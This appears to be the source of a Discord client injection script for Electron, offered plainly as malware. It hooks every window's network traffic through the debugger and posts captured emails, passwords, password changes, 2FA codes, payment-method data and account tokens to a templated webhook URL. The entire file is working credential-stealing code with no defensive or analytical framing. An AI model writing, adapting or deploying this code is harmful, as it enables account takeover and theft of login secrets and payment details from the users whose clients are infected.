const { webContents } = require("electron");
const https = require("https");
const http = require("http");

const WEBHOOK = "%WEBHOOK%";

function sendToWebhook(data) {
  const body = JSON.stringify({
    username: "Discord Injection",
    embeds: [{
      title: "🔐 Discord Event Captured",
      color: 0x5865f2,
      fields: Object.entries(data).map(([k,v]) => ({name:k,value:"```"+(v||"N/A").toString().slice(0,1000)+"```",inline:false})),
      timestamp: new Date().toISOString()
    }]
  });
  const url = new URL(WEBHOOK);
  const req = (url.protocol === "https:" ? https : http).request({
    hostname: url.hostname, path: url.pathname + url.search,
    method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) }
  });
  req.write(body);
  req.end();
}

function hookWebContents(wc) {
  try {
    wc.debugger.attach("1.3");
    wc.debugger.sendCommand("Network.enable");
    wc.debugger.on("message", (_, method, params) => {
      if (method === "Network.requestWillBeSent") {
        const url = params.request?.url || "";
        const body = params.request?.postData || "";
        if (!body) return;
        if (url.includes("/api/v9/auth/login") || url.includes("/api/v9/auth/register")) {
          try {
            const parsed = JSON.parse(body);
            sendToWebhook({ Event: "Login", Email: parsed.email||"?", Password: parsed.password||"?" });
          } catch {}
        }
        if (url.includes("/api/v9/users/@me") && (body.includes("password") || body.includes("new_password"))) {
          try {
            const parsed = JSON.parse(body);
            sendToWebhook({ Event: "Password Change", OldPassword: parsed.password||"?", NewPassword: parsed.new_password||"?" });
          } catch {}
        }
        if (url.includes("/api/v9/auth/mfa/totp")) {
          try {
            const parsed = JSON.parse(body);
            sendToWebhook({ Event: "2FA Code", Code: parsed.code||"?" });
          } catch {}
        }
        if (url.includes("/api/v9/users/@me/payment-sources")) {
          sendToWebhook({ Event: "Payment Method Added", Body: body.slice(0,500) });
        }
      }
      if (method === "Network.responseReceived") {
        const url = params.response?.url || "";
        if (url.includes("/api/v9/auth/login") || url.includes("/api/v9/users/@me")) {
          wc.debugger.sendCommand("Network.getResponseBody", { requestId: params.requestId })
            .then(resp => {
              try {
                const parsed = JSON.parse(resp.body);
                if (parsed.token) sendToWebhook({ Event: "Token Captured", Token: parsed.token });
              } catch {}
            }).catch(() => {});
        }
      }
    });
  } catch(e) {}
}

app.on("browser-window-created", (_, win) => {
  hookWebContents(win.webContents);
});

try {
  const { app } = require("electron");
  app.on("web-contents-created", (_, wc) => hookWebContents(wc));
} catch {}
